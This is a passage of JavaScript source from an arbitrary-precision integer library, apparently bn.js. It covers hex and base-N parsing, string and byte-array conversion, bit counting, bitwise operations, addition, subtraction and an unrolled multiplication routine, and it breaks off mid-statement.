48 && c <= 57) {\n      return c - 48;\n    // 'A' - 'F'\n    } else if (c >= 65 && c <= 70) {\n      return c - 55;\n    // 'a' - 'f'\n    } else if (c >= 97 && c <= 102) {\n      return c - 87;\n    } else {\n      assert(false, 'Invalid character in ' + string);\n    }\n  }\n\n  function parseHexByte (string, lowerBound, index) {\n    var r = parseHex4Bits(string, index);\n    if (index - 1 >= lowerBound) {\n      r |= parseHex4Bits(string, index - 1) << 4;\n    }\n    return r;\n  }\n\n  BN.prototype._parseHex = function _parseHex (number, start, endian) {\n    // Create possibly bigger array to ensure that it fits the number\n    this.length = Math.ceil((number.length - start) / 6);\n    this.words = new Array(this.length);\n    for (var i = 0; i < this.length; i++) {\n      this.words[i] = 0;\n    }\n\n    // 24-bits chunks\n    var off = 0;\n    var j = 0;\n\n    var w;\n    if (endian === 'be') {\n      for (i = number.length - 1; i >= start; i -= 2) {\n        w = parseHexByte(number, start, i) << off;\n        this.words[j] |= w & 0x3ffffff;\n        if (off >= 18) {\n          off -= 18;\n          j += 1;\n          this.words[j] |= w >>> 26;\n        } else {\n          off += 8;\n        }\n      }\n    } else {\n      var parseLength = number.length - start;\n      for (i = parseLength % 2 === 0 ? start + 1 : start; i < number.length; i += 2) {\n        w = parseHexByte(number, start, i) << off;\n        this.words[j] |= w & 0x3ffffff;\n        if (off >= 18) {\n          off -= 18;\n          j += 1;\n          this.words[j] |= w >>> 26;\n        } else {\n          off += 8;\n        }\n      }\n    }\n\n    this._strip();\n  };\n\n  function parseBase (str, start, end, mul) {\n    var r = 0;\n    var b = 0;\n    var len = Math.min(str.length, end);\n    for (var i = start; i < len; i++) {\n      var c = str.charCodeAt(i) - 48;\n\n      r *= mul;\n\n      // 'a'\n      if (c >= 49) {\n        b = c - 49 + 0xa;\n\n      // 'A'\n      } else if (c >= 17) {\n        b = c - 17 + 0xa;\n\n      // '0' - '9'\n      } else {\n        b = c;\n      }\n      assert(c >= 0 && b < mul, 'Invalid character');\n      r += b;\n    }\n    return r;\n  }\n\n  BN.prototype._parseBase = function _parseBase (number, base, start) {\n    // Initialize as zero\n    this.words = [0];\n    this.length = 1;\n\n    // Find length of limb in base\n    for (var limbLen = 0, limbPow = 1; limbPow <= 0x3ffffff; limbPow *= base) {\n      limbLen++;\n    }\n    limbLen--;\n    limbPow = (limbPow / base) | 0;\n\n    var total = number.length - start;\n    var mod = total % limbLen;\n    var end = Math.min(total, total - mod) + start;\n\n    var word = 0;\n    for (var i = start; i < end; i += limbLen) {\n      word = parseBase(number, i, i + limbLen, base);\n\n      this.imuln(limbPow);\n      if (this.words[0] + word < 0x4000000) {\n        this.words[0] += word;\n      } else {\n        this._iaddn(word);\n      }\n    }\n\n    if (mod !== 0) {\n      var pow = 1;\n      word = parseBase(number, i, number.length, base);\n\n      for (i = 0; i < mod; i++) {\n        pow *= base;\n      }\n\n      this.imuln(pow);\n      if (this.words[0] + word < 0x4000000) {\n        this.words[0] += word;\n      } else {\n        this._iaddn(word);\n      }\n    }\n\n    this._strip();\n  };\n\n  BN.prototype.copy = function copy (dest) {\n    dest.words = new Array(this.length);\n    for (var i = 0; i < this.length; i++) {\n      dest.words[i] = this.words[i];\n    }\n    dest.length = this.length;\n    dest.negative = this.negative;\n    dest.red = this.red;\n  };\n\n  function move (dest, src) {\n    dest.words = src.words;\n    dest.length = src.length;\n    dest.negative = src.negative;\n    dest.red = src.red;\n  }\n\n  BN.prototype._move = function _move (dest) {\n    move(dest, this);\n  };\n\n  BN.prototype.clone = function clone () {\n    var r = new BN(null);\n    this.copy(r);\n    return r;\n  };\n\n  BN.prototype._expand = function _expand (size) {\n    while (this.length < size) {\n      this.words[this.length++] = 0;\n    }\n    return this;\n  };\n\n  // Remove leading `0` from `this`\n  BN.prototype._strip = function strip () {\n    while (this.length > 1 && this.words[this.length - 1] === 0) {\n      this.length--;\n    }\n    return this._normSign();\n  };\n\n  BN.prototype._normSign = function _normSign () {\n    // -0 = 0\n    if (this.length === 1 && this.words[0] === 0) {\n      this.negative = 0;\n    }\n    return this;\n  };\n\n  // Check Symbol.for because not everywhere where Symbol defined\n  // See https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol#Browser_compatibility\n  if (typeof Symbol !== 'undefined' && typeof Symbol.for === 'function') {\n    try {\n      BN.prototype[Symbol.for('nodejs.util.inspect.custom')] = inspect;\n    } catch (e) {\n      BN.prototype.inspect = inspect;\n    }\n  } else {\n    BN.prototype.inspect = inspect;\n  }\n\n  function inspect () {\n    return (this.red ? '<BN-R: ' : '<BN: ') + this.toString(16) + '>';\n  }\n\n  /*\n\n  var zeros = [];\n  var groupSizes = [];\n  var groupBases = [];\n\n  var s = '';\n  var i = -1;\n  while (++i < BN.wordSize) {\n    zeros[i] = s;\n    s += '0';\n  }\n  groupSizes[0] = 0;\n  groupSizes[1] = 0;\n  groupBases[0] = 0;\n  groupBases[1] = 0;\n  var base = 2 - 1;\n  while (++base < 36 + 1) {\n    var groupSize = 0;\n    var groupBase = 1;\n    while (groupBase < (1 << BN.wordSize) / base) {\n      groupBase *= base;\n      groupSize += 1;\n    }\n    groupSizes[base] = groupSize;\n    groupBases[base] = groupBase;\n  }\n\n  */\n\n  var zeros = [\n    '',\n    '0',\n    '00',\n    '000',\n    '0000',\n    '00000',\n    '000000',\n    '0000000',\n    '00000000',\n    '000000000',\n    '0000000000',\n    '00000000000',\n    '000000000000',\n    '0000000000000',\n    '00000000000000',\n    '000000000000000',\n    '0000000000000000',\n    '00000000000000000',\n    '000000000000000000',\n    '0000000000000000000',\n    '00000000000000000000',\n    '000000000000000000000',\n    '0000000000000000000000',\n    '00000000000000000000000',\n    '000000000000000000000000',\n    '0000000000000000000000000'\n  ];\n\n  var groupSizes = [\n    0, 0,\n    25, 16, 12, 11, 10, 9, 8,\n    8, 7, 7, 7, 7, 6, 6,\n    6, 6, 6, 6, 6, 5, 5,\n    5, 5, 5, 5, 5, 5, 5,\n    5, 5, 5, 5, 5, 5, 5\n  ];\n\n  var groupBases = [\n    0, 0,\n    33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216,\n    43046721, 10000000, 19487171, 35831808, 62748517, 7529536, 11390625,\n    16777216, 24137569, 34012224, 47045881, 64000000, 4084101, 5153632,\n    6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149,\n    24300000, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176\n  ];\n\n  BN.prototype.toString = function toString (base, padding) {\n    base = base || 10;\n    padding = padding | 0 || 1;\n\n    var out;\n    if (base === 16 || base === 'hex') {\n      out = '';\n      var off = 0;\n      var carry = 0;\n      for (var i = 0; i < this.length; i++) {\n        var w = this.words[i];\n        var word = (((w << off) | carry) & 0xffffff).toString(16);\n        carry = (w >>> (24 - off)) & 0xffffff;\n        off += 2;\n        if (off >= 26) {\n          off -= 26;\n          i--;\n        }\n        if (carry !== 0 || i !== this.length - 1) {\n          out = zeros[6 - word.length] + word + out;\n        } else {\n          out = word + out;\n        }\n      }\n      if (carry !== 0) {\n        out = carry.toString(16) + out;\n      }\n      while (out.length % padding !== 0) {\n        out = '0' + out;\n      }\n      if (this.negative !== 0) {\n        out = '-' + out;\n      }\n      return out;\n    }\n\n    if (base === (base | 0) && base >= 2 && base <= 36) {\n      // var groupSize = Math.floor(BN.wordSize * Math.LN2 / Math.log(base));\n      var groupSize = groupSizes[base];\n      // var groupBase = Math.pow(base, groupSize);\n      var groupBase = groupBases[base];\n      out = '';\n      var c = this.clone();\n      c.negative = 0;\n      while (!c.isZero()) {\n        var r = c.modrn(groupBase).toString(base);\n        c = c.idivn(groupBase);\n\n        if (!c.isZero()) {\n          out = zeros[groupSize - r.length] + r + out;\n        } else {\n          out = r + out;\n        }\n      }\n      if (this.isZero()) {\n        out = '0' + out;\n      }\n      while (out.length % padding !== 0) {\n        out = '0' + out;\n      }\n      if (this.negative !== 0) {\n        out = '-' + out;\n      }\n      return out;\n    }\n\n    assert(false, 'Base should be between 2 and 36');\n  };\n\n  BN.prototype.toNumber = function toNumber () {\n    var ret = this.words[0];\n    if (this.length === 2) {\n      ret += this.words[1] * 0x4000000;\n    } else if (this.length === 3 && this.words[2] === 0x01) {\n      // NOTE: at this stage it is known that the top bit is set\n      ret += 0x10000000000000 + (this.words[1] * 0x4000000);\n    } else if (this.length > 2) {\n      assert(false, 'Number can only safely store up to 53 bits');\n    }\n    return (this.negative !== 0) ? -ret : ret;\n  };\n\n  BN.prototype.toJSON = function toJSON () {\n    return this.toString(16, 2);\n  };\n\n  if (Buffer) {\n    BN.prototype.toBuffer = function toBuffer (endian, length) {\n      return this.toArrayLike(Buffer, endian, length);\n    };\n  }\n\n  BN.prototype.toArray = function toArray (endian, length) {\n    return this.toArrayLike(Array, endian, length);\n  };\n\n  var allocate = function allocate (ArrayType, size) {\n    if (ArrayType.allocUnsafe) {\n      return ArrayType.allocUnsafe(size);\n    }\n    return new ArrayType(size);\n  };\n\n  BN.prototype.toArrayLike = function toArrayLike (ArrayType, endian, length) {\n    this._strip();\n\n    var byteLength = this.byteLength();\n    var reqLength = length || Math.max(1, byteLength);\n    assert(byteLength <= reqLength, 'byte array longer than desired length');\n    assert(reqLength > 0, 'Requested array length <= 0');\n\n    var res = allocate(ArrayType, reqLength);\n    var postfix = endian === 'le' ? 'LE' : 'BE';\n    this['_toArrayLike' + postfix](res, byteLength);\n    return res;\n  };\n\n  BN.prototype._toArrayLikeLE = function _toArrayLikeLE (res, byteLength) {\n    var position = 0;\n    var carry = 0;\n\n    for (var i = 0, shift = 0; i < this.length; i++) {\n      var word = (this.words[i] << shift) | carry;\n\n      res[position++] = word & 0xff;\n      if (position < res.length) {\n        res[position++] = (word >> 8) & 0xff;\n      }\n      if (position < res.length) {\n        res[position++] = (word >> 16) & 0xff;\n      }\n\n      if (shift === 6) {\n        if (position < res.length) {\n          res[position++] = (word >> 24) & 0xff;\n        }\n        carry = 0;\n        shift = 0;\n      } else {\n        carry = word >>> 24;\n        shift += 2;\n      }\n    }\n\n    if (position < res.length) {\n      res[position++] = carry;\n\n      while (position < res.length) {\n        res[position++] = 0;\n      }\n    }\n  };\n\n  BN.prototype._toArrayLikeBE = function _toArrayLikeBE (res, byteLength) {\n    var position = res.length - 1;\n    var carry = 0;\n\n    for (var i = 0, shift = 0; i < this.length; i++) {\n      var word = (this.words[i] << shift) | carry;\n\n      res[position--] = word & 0xff;\n      if (position >= 0) {\n        res[position--] = (word >> 8) & 0xff;\n      }\n      if (position >= 0) {\n        res[position--] = (word >> 16) & 0xff;\n      }\n\n      if (shift === 6) {\n        if (position >= 0) {\n          res[position--] = (word >> 24) & 0xff;\n        }\n        carry = 0;\n        shift = 0;\n      } else {\n        carry = word >>> 24;\n        shift += 2;\n      }\n    }\n\n    if (position >= 0) {\n      res[position--] = carry;\n\n      while (position >= 0) {\n        res[position--] = 0;\n      }\n    }\n  };\n\n  if (Math.clz32) {\n    BN.prototype._countBits = function _countBits (w) {\n      return 32 - Math.clz32(w);\n    };\n  } else {\n    BN.prototype._countBits = function _countBits (w) {\n      var t = w;\n      var r = 0;\n      if (t >= 0x1000) {\n        r += 13;\n        t >>>= 13;\n      }\n      if (t >= 0x40) {\n        r += 7;\n        t >>>= 7;\n      }\n      if (t >= 0x8) {\n        r += 4;\n        t >>>= 4;\n      }\n      if (t >= 0x02) {\n        r += 2;\n        t >>>= 2;\n      }\n      return r + t;\n    };\n  }\n\n  BN.prototype._zeroBits = function _zeroBits (w) {\n    // Short-cut\n    if (w === 0) return 26;\n\n    var t = w;\n    var r = 0;\n    if ((t & 0x1fff) === 0) {\n      r += 13;\n      t >>>= 13;\n    }\n    if ((t & 0x7f) === 0) {\n      r += 7;\n      t >>>= 7;\n    }\n    if ((t & 0xf) === 0) {\n      r += 4;\n      t >>>= 4;\n    }\n    if ((t & 0x3) === 0) {\n      r += 2;\n      t >>>= 2;\n    }\n    if ((t & 0x1) === 0) {\n      r++;\n    }\n    return r;\n  };\n\n  // Return number of used bits in a BN\n  BN.prototype.bitLength = function bitLength () {\n    var w = this.words[this.length - 1];\n    var hi = this._countBits(w);\n    return (this.length - 1) * 26 + hi;\n  };\n\n  function toBitArray (num) {\n    var w = new Array(num.bitLength());\n\n    for (var bit = 0; bit < w.length; bit++) {\n      var off = (bit / 26) | 0;\n      var wbit = bit % 26;\n\n      w[bit] = (num.words[off] >>> wbit) & 0x01;\n    }\n\n    return w;\n  }\n\n  // Number of trailing zero bits\n  BN.prototype.zeroBits = function zeroBits () {\n    if (this.isZero()) return 0;\n\n    var r = 0;\n    for (var i = 0; i < this.length; i++) {\n      var b = this._zeroBits(this.words[i]);\n      r += b;\n      if (b !== 26) break;\n    }\n    return r;\n  };\n\n  BN.prototype.byteLength = function byteLength () {\n    return Math.ceil(this.bitLength() / 8);\n  };\n\n  BN.prototype.toTwos = function toTwos (width) {\n    if (this.negative !== 0) {\n      return this.abs().inotn(width).iaddn(1);\n    }\n    return this.clone();\n  };\n\n  BN.prototype.fromTwos = function fromTwos (width) {\n    if (this.testn(width - 1)) {\n      return this.notn(width).iaddn(1).ineg();\n    }\n    return this.clone();\n  };\n\n  BN.prototype.isNeg = function isNeg () {\n    return this.negative !== 0;\n  };\n\n  // Return negative clone of `this`\n  BN.prototype.neg = function neg () {\n    return this.clone().ineg();\n  };\n\n  BN.prototype.ineg = function ineg () {\n    if (!this.isZero()) {\n      this.negative ^= 1;\n    }\n\n    return this;\n  };\n\n  // Or `num` with `this` in-place\n  BN.prototype.iuor = function iuor (num) {\n    while (this.length < num.length) {\n      this.words[this.length++] = 0;\n    }\n\n    for (var i = 0; i < num.length; i++) {\n      this.words[i] = this.words[i] | num.words[i];\n    }\n\n    return this._strip();\n  };\n\n  BN.prototype.ior = function ior (num) {\n    assert((this.negative | num.negative) === 0);\n    return this.iuor(num);\n  };\n\n  // Or `num` with `this`\n  BN.prototype.or = function or (num) {\n    if (this.length > num.length) return this.clone().ior(num);\n    return num.clone().ior(this);\n  };\n\n  BN.prototype.uor = function uor (num) {\n    if (this.length > num.length) return this.clone().iuor(num);\n    return num.clone().iuor(this);\n  };\n\n  // And `num` with `this` in-place\n  BN.prototype.iuand = function iuand (num) {\n    // b = min-length(num, this)\n    var b;\n    if (this.length > num.length) {\n      b = num;\n    } else {\n      b = this;\n    }\n\n    for (var i = 0; i < b.length; i++) {\n      this.words[i] = this.words[i] & num.words[i];\n    }\n\n    this.length = b.length;\n\n    return this._strip();\n  };\n\n  BN.prototype.iand = function iand (num) {\n    assert((this.negative | num.negative) === 0);\n    return this.iuand(num);\n  };\n\n  // And `num` with `this`\n  BN.prototype.and = function and (num) {\n    if (this.length > num.length) return this.clone().iand(num);\n    return num.clone().iand(this);\n  };\n\n  BN.prototype.uand = function uand (num) {\n    if (this.length > num.length) return this.clone().iuand(num);\n    return num.clone().iuand(this);\n  };\n\n  // Xor `num` with `this` in-place\n  BN.prototype.iuxor = function iuxor (num) {\n    // a.length > b.length\n    var a;\n    var b;\n    if (this.length > num.length) {\n      a = this;\n      b = num;\n    } else {\n      a = num;\n      b = this;\n    }\n\n    for (var i = 0; i < b.length; i++) {\n      this.words[i] = a.words[i] ^ b.words[i];\n    }\n\n    if (this !== a) {\n      for (; i < a.length; i++) {\n        this.words[i] = a.words[i];\n      }\n    }\n\n    this.length = a.length;\n\n    return this._strip();\n  };\n\n  BN.prototype.ixor = function ixor (num) {\n    assert((this.negative | num.negative) === 0);\n    return this.iuxor(num);\n  };\n\n  // Xor `num` with `this`\n  BN.prototype.xor = function xor (num) {\n    if (this.length > num.length) return this.clone().ixor(num);\n    return num.clone().ixor(this);\n  };\n\n  BN.prototype.uxor = function uxor (num) {\n    if (this.length > num.length) return this.clone().iuxor(num);\n    return num.clone().iuxor(this);\n  };\n\n  // Not ``this`` with ``width`` bitwidth\n  BN.prototype.inotn = function inotn (width) {\n    assert(typeof width === 'number' && width >= 0);\n\n    var bytesNeeded = Math.ceil(width / 26) | 0;\n    var bitsLeft = width % 26;\n\n    // Extend the buffer with leading zeroes\n    this._expand(bytesNeeded);\n\n    if (bitsLeft > 0) {\n      bytesNeeded--;\n    }\n\n    // Handle complete words\n    for (var i = 0; i < bytesNeeded; i++) {\n      this.words[i] = ~this.words[i] & 0x3ffffff;\n    }\n\n    // Handle the residue\n    if (bitsLeft > 0) {\n      this.words[i] = ~this.words[i] & (0x3ffffff >> (26 - bitsLeft));\n    }\n\n    // And remove leading zeroes\n    return this._strip();\n  };\n\n  BN.prototype.notn = function notn (width) {\n    return this.clone().inotn(width);\n  };\n\n  // Set `bit` of `this`\n  BN.prototype.setn = function setn (bit, val) {\n    assert(typeof bit === 'number' && bit >= 0);\n\n    var off = (bit / 26) | 0;\n    var wbit = bit % 26;\n\n    this._expand(off + 1);\n\n    if (val) {\n      this.words[off] = this.words[off] | (1 << wbit);\n    } else {\n      this.words[off] = this.words[off] & ~(1 << wbit);\n    }\n\n    return this._strip();\n  };\n\n  // Add `num` to `this` in-place\n  BN.prototype.iadd = function iadd (num) {\n    var r;\n\n    // negative + positive\n    if (this.negative !== 0 && num.negative === 0) {\n      this.negative = 0;\n      r = this.isub(num);\n      this.negative ^= 1;\n      return this._normSign();\n\n    // positive + negative\n    } else if (this.negative === 0 && num.negative !== 0) {\n      num.negative = 0;\n      r = this.isub(num);\n      num.negative = 1;\n      return r._normSign();\n    }\n\n    // a.length > b.length\n    var a, b;\n    if (this.length > num.length) {\n      a = this;\n      b = num;\n    } else {\n      a = num;\n      b = this;\n    }\n\n    var carry = 0;\n    for (var i = 0; i < b.length; i++) {\n      r = (a.words[i] | 0) + (b.words[i] | 0) + carry;\n      this.words[i] = r & 0x3ffffff;\n      carry = r >>> 26;\n    }\n    for (; carry !== 0 && i < a.length; i++) {\n      r = (a.words[i] | 0) + carry;\n      this.words[i] = r & 0x3ffffff;\n      carry = r >>> 26;\n    }\n\n    this.length = a.length;\n    if (carry !== 0) {\n      this.words[this.length] = carry;\n      this.length++;\n    // Copy the rest of the words\n    } else if (a !== this) {\n      for (; i < a.length; i++) {\n        this.words[i] = a.words[i];\n      }\n    }\n\n    return this;\n  };\n\n  // Add `num` to `this`\n  BN.prototype.add = function add (num) {\n    var res;\n    if (num.negative !== 0 && this.negative === 0) {\n      num.negative = 0;\n      res = this.sub(num);\n      num.negative ^= 1;\n      return res;\n    } else if (num.negative === 0 && this.negative !== 0) {\n      this.negative = 0;\n      res = num.sub(this);\n      this.negative = 1;\n      return res;\n    }\n\n    if (this.length > num.length) return this.clone().iadd(num);\n\n    return num.clone().iadd(this);\n  };\n\n  // Subtract `num` from `this` in-place\n  BN.prototype.isub = function isub (num) {\n    // this - (-num) = this + num\n    if (num.negative !== 0) {\n      num.negative = 0;\n      var r = this.iadd(num);\n      num.negative = 1;\n      return r._normSign();\n\n    // -this - num = -(this + num)\n    } else if (this.negative !== 0) {\n      this.negative = 0;\n      this.iadd(num);\n      this.negative = 1;\n      return this._normSign();\n    }\n\n    // At this point both numbers are positive\n    var cmp = this.cmp(num);\n\n    // Optimization - zeroify\n    if (cmp === 0) {\n      this.negative = 0;\n      this.length = 1;\n      this.words[0] = 0;\n      return this;\n    }\n\n    // a > b\n    var a, b;\n    if (cmp > 0) {\n      a = this;\n      b = num;\n    } else {\n      a = num;\n      b = this;\n    }\n\n    var carry = 0;\n    for (var i = 0; i < b.length; i++) {\n      r = (a.words[i] | 0) - (b.words[i] | 0) + carry;\n      carry = r >> 26;\n      this.words[i] = r & 0x3ffffff;\n    }\n    for (; carry !== 0 && i < a.length; i++) {\n      r = (a.words[i] | 0) + carry;\n      carry = r >> 26;\n      this.words[i] = r & 0x3ffffff;\n    }\n\n    // Copy rest of the words\n    if (carry === 0 && i < a.length && a !== this) {\n      for (; i < a.length; i++) {\n        this.words[i] = a.words[i];\n      }\n    }\n\n    this.length = Math.max(this.length, i);\n\n    if (a !== this) {\n      this.negative = 1;\n    }\n\n    return this._strip();\n  };\n\n  // Subtract `num` from `this`\n  BN.prototype.sub = function sub (num) {\n    return this.clone().isub(num);\n  };\n\n  function smallMulTo (self, num, out) {\n    out.negative = num.negative ^ self.negative;\n    var len = (self.length + num.length) | 0;\n    out.length = len;\n    len = (len - 1) | 0;\n\n    // Peel one iteration (compiler can't do it, because of code complexity)\n    var a = self.words[0] | 0;\n    var b = num.words[0] | 0;\n    var r = a * b;\n\n    var lo = r & 0x3ffffff;\n    var carry = (r / 0x4000000) | 0;\n    out.words[0] = lo;\n\n    for (var k = 1; k < len; k++) {\n      // Sum all words with the same `i + j = k` and accumulate `ncarry`,\n      // note that ncarry could be >= 0x3ffffff\n      var ncarry = carry >>> 26;\n      var rword = carry & 0x3ffffff;\n      var maxJ = Math.min(k, num.length - 1);\n      for (var j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {\n        var i = (k - j) | 0;\n        a = self.words[i] | 0;\n        b = num.words[j] | 0;\n        r = a * b + rword;\n        ncarry += (r / 0x4000000) | 0;\n        rword = r & 0x3ffffff;\n      }\n      out.words[k] = rword | 0;\n      carry = ncarry | 0;\n    }\n    if (carry !== 0) {\n      out.words[k] = carry | 0;\n    } else {\n      out.length--;\n    }\n\n    return out._strip();\n  }\n\n  // TODO(indutny): it may be reasonable to omit it for users who don't need\n  // to work with 256-bit numbers, otherwise it gives 20% improvement for 256-bit\n  // multiplication (like elliptic secp256k1).\n  var comb10MulTo = function comb10MulTo (self, num, out) {\n    var a = self.words;\n    var b = num.words;\n    var o = out.words;\n    var c = 0;\n    var lo;\n    var mid;\n    var hi;\n    var a0 = a[0] | 0;\n    var al0 = a0 & 0x1fff;\n    var ah0 = a0 >>> 13;\n    var a1 = a[1] | 0;\n    var al1 = a1 & 0x1fff;\n    var ah1 = a1 >>> 13;\n    var a2 = a[2] | 0;\n    var al2 = a2 & 0x1fff;\n    var ah2 = a2 >>> 13;\n    var a3 = a[3] | 0;\n    var al3 = a3 & 0x1fff;\n    var ah3 = a3 >>> 13;\n    var a4 = a[4] | 0;\n    var al4 = a4 & 0x1fff;\n    var ah4 = a4 >>> 13;\n    var a5 = a[5] | 0;\n    var al5 = a5 & 0x1fff;\n    var ah5 = a5 >>> 13;\n    var a6 = a[6] | 0;\n    var al6 = a6 & 0x1fff;\n    var ah6 = a6 >>> 13;\n    var a7 = a[7] | 0;\n    var al7 = a7 & 0x1fff;\n    var ah7 = a7 >>> 13;\n    var a8 = a[8] | 0;\n    var al8 = a8 & 0x1fff;\n    var ah8 = a8 >>> 13;\n    var a9 = a[9] | 0;\n    var al9 = a9 & 0x1fff;\n    var ah9 = a9 >>> 13;\n    var b0 = b[0] | 0;\n    var bl0 = b0 & 0x1fff;\n    var bh0 = b0 >>> 13;\n    var b1 = b[1] | 0;\n    var bl1 = b1 & 0x1fff;\n    var bh1 = b1 >>> 13;\n    var b2 = b[2] | 0;\n    var bl2 = b2 & 0x1fff;\n    var bh2 = b2 >>> 13;\n    var b3 = b[3] | 0;\n    var bl3 = b3 & 0x1fff;\n    var bh3 = b3 >>> 13;\n    var b4 = b[4] | 0;\n    var bl4 = b4 & 0x1fff;\n    var bh4 = b4 >>> 13;\n    var b5 = b[5] | 0;\n    var bl5 = b5 & 0x1fff;\n    var bh5 = b5 >>> 13;\n    var b6 = b[6] | 0;\n    var bl6 = b6 & 0x1fff;\n    var bh6 = b6 >>> 13;\n    var b7 = b[7] | 0;\n    var bl7 = b7 & 0x1fff;\n    var bh7 = b7 >>> 13;\n    var b8 = b[8] | 0;\n    var bl8 = b8 & 0x1fff;\n    var bh8 = b8 >>> 13;\n    var b9 = b[9] | 0;\n    var bl9 = b9 & 0x1fff;\n    var bh9 = b9 >>> 13;\n\n    out.negative = self.negative ^ num.negative;\n    out.length = 19;\n    /* k = 0 */\n    lo = Math.imul(al0, bl0);\n    mid = Math.imul(al0, bh0);\n    mid = (mid + Math.imul(ah0, bl0)) | 0;\n    hi = Math.imul(ah0, bh0);\n    var w0 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0;\n    w0 &= 0x3ffffff;\n    /* k = 1 */\n    lo = Math.imul(al1, bl0);\n    mid = Math.imul(al1, bh0);\n    mid = (mid + Math.imul(ah1, bl0)) | 0;\n    hi = Math.imul(ah1, bh0);\n    lo = (lo + Math.imul(al0, bl1)) | 0;\n    mid = (mid + Math.imul(al0, bh1)) | 0;\n    mid = (mid + Math.imul(ah0, bl1)) | 0;\n    hi = (hi + Math.imul(ah0, bh1)) | 0;\n    var w1 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0;\n    w1 &= 0x3ffffff;\n    /* k = 2 */\n    lo = Math.imul(al2, bl0);\n    mid = Math.imul(al2, bh0);\n    mid = (mid + Math.imul(ah2, bl0)) | 0;\n    hi = Math.imul(ah2, bh0);\n    lo = (lo + Math.imul(al1, bl1)) | 0;\n    mid = (mid + Math.imul(al1, bh1)) | 0;\n    mid = (mid + Math.imul(ah1, bl1)) | 0;\n    hi = (hi + Math.imul(ah1, bh1)) | 0;\n    lo = (lo + Math.imul(al0, bl2)) | 0;\n    mid = (mid + Math.imul(al0, bh2)) | 0;\n    mid = (mid + Math.imul(ah0, bl2)) | 0;\n    hi = (hi + Math.imul(ah0, bh2)) | 0;\n    var w2 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0;\n    w2 &= 0x3ffffff;\n    /* k = 3 */\n    lo = Math.imul(al3, bl0);\n    mid = Math.imul(al3, bh0);\n    mid = (mid + Math.imul(ah3, bl0)) | 0;\n    hi = Math.imul(ah3, bh0);\n    lo = (lo + Math.imul(al2, bl1)) | 0;\n    mid = (mid + Math.imul(al2, bh1)) | 0;\n    mid = (mid + Math.imul(ah2, bl1)) | 0;\n    hi = (hi + Math.imul(ah2, bh1)) | 0;\n    lo = (lo + Math.imul(al1, bl2)) | 0;\n    mid = (mid + Math.imul(al1, bh2)) | 0;\n    mid = (mid + Math.imul(ah1, bl2)) | 0;\n    hi = (hi + Math.imul(ah1, bh2)) | 0;\n    lo = (lo + Math.imul(al0, bl3)) | 0;\n    mid = (mid + Math.imul(al0, bh3)) | 0;\n    mid = (mid + Math.imul(ah0, bl3)) | 0;\n    hi = (hi + Math.imul(ah0, bh3)) | 0;\n    var w3 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0;\n    w3 &= 0x3ffffff;\n    /* k = 4 */\n    lo = Math.imul(al4, bl0);\n    mid = Math.imul(al4, bh0);\n    mid = (mid + Math.imul(ah4, bl0)) | 0;\n    hi = Math.imul(ah4, bh0);\n    lo = (lo + Math.imul(al3, bl1)) | 0;\n    mid = (mid + Math.imul(al3, bh1)) | 0;\n    mid = (mid + Math.imul(ah3, bl1)) | 0;\n    hi = (hi + Math.imul(ah3, bh1)) | 0;\n    lo = (lo + Math.imul(al2, bl2)) | 0;\n    mid = (mid + Math.imul(al2, bh2)) | 0;\n    mid = (mid + Math.imul(ah2, bl2)) | 0;\n    hi = (hi + Math.imul(ah2, bh2)) | 0;\n    lo = (lo + Math.imul(al1, bl3)) | 0;\n    mid = (mid + Math.imul(al1, bh3)) | 0;\n    mid = (mid + Math.imul(ah1, bl3)) | 0;\n    hi = (hi + Math.imul(ah1, bh3)) | 0;\n    lo = (lo + Math.imul(al0, bl4)) | 0;\n    mid = (mid + Math.imul(al0, bh4)) | 0;\n    mid = (mid + Math.imul(ah0, bl4)) | 0;\n    hi = (hi + Math.imul(ah0, bh4)) | 0;\n    var w4 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0;\n    w4 &= 0x3ffffff;\n    /* k = 5 */\n    lo = Math.imul(al5, bl0);\n    mid = Math.imul(al5, bh0);\n    mid = (mid + Math.imul(ah5, bl0)) | 0;\n    hi = Math.imul(ah5, bh0);\n    lo = (lo + Math.imul(al4, bl1)) | 0;\n    mid = (mid + Math.imul(al4, bh1)) | 0;\n    mid = (mid + Math.imul(ah4, bl1)) | 0;\n    hi = (hi + Math.imul(ah4, bh1)) | 0;\n    lo = (lo + Math.imul(al3, bl2)) | 0;\n    mid = (mid + Math.imul(al3, bh2)) | 0;\n    mid = (mid + Math.imul(ah3, bl2)) | 0;\n    hi = (hi + Math.imul(ah3, bh2)) | 0;\n    lo = (lo + Math.imul(al2, bl3)) | 0;\n    mid = (mid + Math.imul(al2, bh3)) | 0;\n    mid = (mid + Math.imul(ah2, bl3)) | 0;\n    hi = (hi + Math.imul(ah2, bh3)) | 0;\n    lo = (lo + Math.imul(al1, bl4)) | 0;\n    mid = (mid + Math.imul(al1, bh4)) | 0;\n    mid = (mid + Math.imul(ah1, bl4)) | 0;\n    hi = (hi + Math.imul(ah1, bh4)) | 0;\n    lo = (lo + Math.imul(al0, bl5)) | 0;\n    mid = (mid + Math.imul(al0, bh5)) | 0;\n    mid = (mid + Math.imul(ah0, bl5)) | 0;\n    hi = (hi + Math.imul(ah0, bh5)) | 0;\n    var w5 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0;\n    w5 &= 0x3ffffff;\n    /* k = 6 */\n    lo = Math.imul(al6, bl0);\n    mid = Math.imul(al6, bh0);\n    mid = (mid + Math.imul(ah6, bl0)) | 0;\n    hi = Math.imul(ah6, bh0);\n    lo = (lo + Math.imul(al5, bl1)) | 0;\n    mid = (mid + 